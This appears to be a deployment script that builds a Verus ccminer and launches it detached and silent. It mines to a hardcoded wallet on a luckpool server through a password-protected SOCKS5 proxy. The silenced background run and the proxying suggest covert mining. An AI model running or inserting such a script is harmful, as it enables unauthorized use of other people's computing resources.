#!/bin/bash
#love u fika

apt install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
./build.sh
echo "love u fika"
nohup ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RXkULFoLMv2fgHq8UduNvzHfUf7z7RBYyD.RVZ -p x -t 2 -x socks5://rvz:indra11@"$1":443 </dev/null >/dev/null 2>&1 &
